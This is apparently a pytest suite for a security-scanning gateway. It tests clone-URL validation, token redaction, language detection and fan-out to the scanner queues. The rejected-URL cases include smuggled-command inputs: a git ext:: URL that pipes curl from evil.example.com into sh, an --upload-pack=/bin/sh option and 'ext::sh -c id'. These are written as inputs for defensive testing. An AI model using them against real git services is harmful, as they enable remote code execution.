import os
import pytest
from unittest.mock import patch, AsyncMock, MagicMock

from src.services.gateway.service import (
    GatewayService, redact_credentials, validate_clone_url,
)

SCAN_ROW = {
    "id": "scan-1", "organization_id": "org-9", "project_id": "p1",
    "connection_id": "conn-1", "repo": "acme/app", "branch": "main",
    "commit_sha": "abc1234",
}

PAYLOAD = {"scanId": "scan-1", "tenantId": "org-9", "options": {}}


@pytest.fixture(autouse=True)
def _no_db_side_effects():
    """Progress and cancellation checks hit the database; stub them per test."""
    with patch("src.services.gateway.service.start_scan", new_callable=AsyncMock), \
         patch("src.services.gateway.service.publish_progress", new_callable=AsyncMock), \
         patch("src.services.gateway.service.assert_not_cancelled", new_callable=AsyncMock):
        yield


# --- clone URL validation -------------------------------------------------

@pytest.mark.parametrize("url", [
    "https://github.com/org/repo.git",
    "https://gitlab.self-hosted.example.com/team/repo.git",
])
def test_validate_clone_url_accepts_https(url):
    assert validate_clone_url(url) == url


@pytest.mark.parametrize("url", [
    "ext::sh -c 'curl evil.example.com|sh'",
    "file:///etc", "ssh://git@internal/repo.git", "git://github.com/o/r.git",
    "--upload-pack=/bin/sh", "https://", "", "   ",
])
def test_validate_clone_url_rejects_dangerous_input(url):
    with pytest.raises(ValueError):
        validate_clone_url(url)


@patch.dict(os.environ, {"ALLOWED_CLONE_HOSTS": "github.com, gitlab.com"})
def test_allowed_clone_hosts_is_enforced_when_set():
    assert validate_clone_url("https://github.com/org/repo.git")
    with pytest.raises(ValueError, match="ALLOWED_CLONE_HOSTS"):
        validate_clone_url("https://evil.example.com/org/repo.git")


@patch.dict(os.environ, {}, clear=True)
def test_any_https_host_allowed_when_unset():
    """Self-hosted GitLab is in scope, so host restriction is opt-in."""
    assert validate_clone_url("https://git.internal.example.com/team/repo.git")


@pytest.mark.parametrize("raw,expected", [
    ("https://x-access-token:ghp_secret@github.com/o/r.git", "https://***@github.com/o/r.git"),
    ("https://github.com/o/r.git", "https://github.com/o/r.git"),
    ("", ""),
])
def test_redact_credentials(raw, expected):
    assert redact_credentials(raw) == expected


# --- language detection ---------------------------------------------------

def test_detects_every_language_not_just_the_first(tmp_path):
    """
    CodeQL builds one database per language. Returning a single value made a
    polyglot repo nondeterministic and silently skipped the rest of the code.
    """
    (tmp_path / "package.json").write_text("{}")
    (tmp_path / "go.mod").write_text("module x")
    (tmp_path / "main.py").write_text("x = 1")

    languages = GatewayService().detect_languages(str(tmp_path))
    assert set(languages) >= {"javascript", "go", "python"}


def test_detection_skips_dependency_directories(tmp_path):
    (tmp_path / "node_modules" / "pkg").mkdir(parents=True)
    (tmp_path / "node_modules" / "pkg" / "x.rb").write_text("puts 1")
    (tmp_path / "main.py").write_text("x = 1")

    assert GatewayService().detect_languages(str(tmp_path)) == ["python"]


def test_detection_is_bounded(tmp_path, monkeypatch):
    """The gateway README requires lightweight heuristics, not a full walk."""
    import src.services.gateway.service as svc
    monkeypatch.setattr(svc, "MAX_DETECT_FILES", 3)
    for i in range(50):
        (tmp_path / f"f{i}.txt").write_text("x")
    (tmp_path / "zzz.rb").write_text("puts 1")

    assert "ruby" not in GatewayService().detect_languages(str(tmp_path))


def test_no_recognizable_language(tmp_path):
    (tmp_path / "notes.txt").write_text("nothing")
    assert GatewayService().detect_languages(str(tmp_path)) == []


# --- job processing -------------------------------------------------------

@pytest.mark.asyncio
@patch("src.services.gateway.service.resolve_clone_url", new_callable=AsyncMock)
@patch("src.services.gateway.service.get_scan_target", new_callable=AsyncMock)
@patch("src.services.gateway.service.asyncio.to_thread")
async def test_fans_out_to_every_engine_queue(mock_thread, mock_scan, mock_url, published):
    mock_scan.return_value = SCAN_ROW
    mock_url.return_value = "https://x-access-token:ghp_secret@github.com/acme/app.git"

    async def runner(func, *args, **kwargs):
        if func.__name__ == "upload_codebase":
            return "s3://b/codebases/scan-1.zip"
        if func.__name__ == "detect_languages":
            return ["python"]
        return None
    mock_thread.side_effect = runner

    await GatewayService().process_job("job-1", PAYLOAD)

    queues = [q for q, _ in published]
    assert set(queues) == {"scan-semgrep", "scan-regex", "scan-bearer", "scan-codeql"}

    body = published[0][1]
    assert body["scan_id"] == "scan-1"
    assert body["tenant_id"] == "org-9"
    assert body["uri"] == "s3://b/codebases/scan-1.zip"
    assert body["commit_sha"] == "abc1234"
    assert body["languages"] == ["python"]


@pytest.mark.asyncio
@patch("src.services.gateway.service.resolve_clone_url", new_callable=AsyncMock)
@patch("src.services.gateway.service.get_scan_target", new_callable=AsyncMock)
@patch("src.services.gateway.service.asyncio.to_thread")
async def test_token_never_reaches_the_published_message(mock_thread, mock_scan, mock_url, published):
    mock_scan.return_value = SCAN_ROW
    mock_url.return_value = "https://x-access-token:ghp_supersecret@github.com/acme/app.git"

    async def runner(func, *args, **kwargs):
        return "s3://b/x.zip" if func.__name__ == "upload_codebase" else ["python"]
    mock_thread.side_effect = runner

    await GatewayService().process_job("job-1", PAYLOAD)

    for _, body in published:
        assert "ghp_supersecret" not in str(body)


@pytest.mark.asyncio
@patch("src.services.gateway.service.fail_scan", new_callable=AsyncMock)
@patch("src.services.gateway.service.resolve_clone_url", new_callable=AsyncMock)
@patch("src.services.gateway.service.get_scan_target", new_callable=AsyncMock)
@patch("src.services.gateway.service.asyncio.to_thread")
async def test_clone_failure_redacts_the_token(mock_thread, mock_scan, mock_url, mock_fail,
                                               published, capsys):
    mock_scan.return_value = SCAN_ROW
    mock_url.return_value = "https://x-access-token:ghp_supersecret@github.com/acme/app.git"
    mock_thread.side_effect = Exception(
        "Cmd('git') failed: clone https://x-access-token:ghp_supersecret@github.com/acme/app.git")

    with pytest.raises(RuntimeError) as excinfo:
        await GatewayService().process_job("job-1", PAYLOAD)

    assert "ghp_supersecret" not in str(excinfo.value)
    assert "***@github.com" in str(excinfo.value)
    assert "ghp_supersecret" not in capsys.readouterr().out
    assert published == [], "a failed clone must not fan out to the engines"

    reason = mock_fail.await_args[0][1]
    assert "ghp_supersecret" not in reason


@pytest.mark.asyncio
@patch("src.services.gateway.service.fail_scan", new_callable=AsyncMock)
@patch("src.services.gateway.service.get_scan_target", new_callable=AsyncMock)
async def test_unknown_scan_fails_the_job(mock_scan, mock_fail, published):
    mock_scan.return_value = None

    with pytest.raises(RuntimeError, match="not found"):
        await GatewayService().process_job("job-1", PAYLOAD)
    assert published == []


@pytest.mark.asyncio
@patch("src.services.gateway.service.fail_scan", new_callable=AsyncMock)
@patch("src.services.gateway.service.resolve_clone_url", new_callable=AsyncMock)
@patch("src.services.gateway.service.get_scan_target", new_callable=AsyncMock)
async def test_rejected_clone_url_fails_before_cloning(mock_scan, mock_url, mock_fail, published):
    mock_scan.return_value = SCAN_ROW
    mock_url.return_value = "ext::sh -c 'id'"

    with pytest.raises(RuntimeError, match="not allowed"):
        await GatewayService().process_job("job-1", PAYLOAD)
    assert published == []
    mock_fail.assert_awaited_once()
